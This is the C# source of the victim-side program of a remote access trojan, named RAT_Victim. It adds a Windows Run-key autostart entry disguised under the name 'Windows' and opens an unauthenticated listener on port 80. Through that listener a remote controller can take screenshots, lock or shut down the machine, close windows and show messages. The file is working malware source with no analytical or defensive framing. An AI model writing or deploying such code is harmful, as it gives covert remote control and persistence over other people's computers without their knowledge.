using Microsoft.Win32;
using RAT_Library;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace RAT_Victim
{
    internal static class Program
    {
        public static Socket Client;

        private static void Main()
        {
            AutoStart(false);
            StartServer();
        }

        private static void AutoStart(bool add)
        {
            var subKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            const string appName = "Windows";
            var valueExists = subKey.GetValue(appName) != null;
            
            if (add && !valueExists)
                subKey.SetValue(appName, Application.ExecutablePath);
            else if (!add && valueExists)
                subKey.DeleteValue(appName);
        }

        private static void StartServer()
        {
            var server = new Socket(SocketType.Stream, ProtocolType.Tcp);
            server.Bind(new IPEndPoint(IPAddress.Any, 80));
            server.Listen(0);

            while (true)
            {
                Client = server.Accept();
                var buffer = new byte[Common.BufferSize];
                var byteCount = Client.Receive(buffer);
                var command = (RatCommand)buffer[0];
                switch (command)
                {
                    case RatCommand.CloseActiveWindow:
                        Commands.CloseActiveWindow();
                        break;
                    case RatCommand.ShowMessageBox:
                        Commands.ShowMessageBox();
                        break;
                    case RatCommand.TakeScreenshot:
                        Commands.TakeScreenshot();
                        break;
                    case RatCommand.Lock:
                        Commands.Lock();
                        break;
                    case RatCommand.Shutdown:
                        Commands.Shutdown();
                        break;
                    case RatCommand.SendMessage:
                        Commands.SendMessage(Common.MessageEncoding.GetString(buffer, 1, byteCount));
                        break;
                    case RatCommand.PlaySound:
                        Commands.PlaySound(new MemoryStream(buffer, 1, byteCount));
                        break;
                    default:
                        throw new ArgumentOutOfRangeException();
                }
            }
            // ReSharper disable once FunctionNeverReturns
        }
    }
}
